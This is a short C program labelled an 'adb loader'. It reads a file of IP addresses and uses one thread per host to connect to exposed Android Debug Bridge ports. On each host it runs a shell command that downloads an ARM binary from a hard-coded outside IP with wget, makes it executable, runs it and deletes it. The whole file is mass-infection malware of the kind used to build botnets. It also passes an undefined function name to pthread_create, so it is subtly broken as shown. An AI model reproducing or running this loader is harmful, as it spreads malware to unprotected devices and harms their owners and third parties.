// adb loader written by hubnr;
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>

#define MAX_IP_LEN 16
#define CMD_MAX_LEN 256

typedef struct 
{
    char ip[MAX_IP_LEN];
    int count;
} adb_args;

void* adb_infect(void* arg) 
{
    adb_args* args = (adb_args*) arg;
    char cmd[CMD_MAX_LEN];
    sprintf(cmd, "adb connect %s", args->ip);
    system(cmd);
    sleep(7);
    sprintf(cmd, "adb -s %s:5555 shell \"cd /data/local/tmp; rm -rf bins.sh; wget http://104.248.113.17/arm7; chmod 777 arm7; ./arm7; rm -rf arm7\"", args->ip);
    system(cmd);
    return NULL;
}

int main(int argc, char** argv) 
{
    if (argc < 2) 
    {
        printf("Usage: %s <file_with_ips>\n", argv[0]);
        return 1;
    }

    FILE* fp = fopen(argv[1], "r");

    if (fp == NULL) 
    {
        printf("Error opening file: %s\n", argv[1]);
        return 1;
    }

    char line[MAX_IP_LEN];
    int count = 0;
    pthread_t threads[1024];

    while (fgets(line, MAX_IP_LEN, fp) != NULL) 
    {
        line[strcspn(line, "\r\n")] = '\0';
        adb_args* args = (adb_args*) malloc(sizeof(adb_args));
        strncpy(args->ip, line, MAX_IP_LEN);
        args->count = ++count;
        pthread_create(&threads[count], NULL, adb, args);
        usleep(100000);
    }

    fclose(fp);

    for (int i = 1; i <= count; ++i) 
    {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
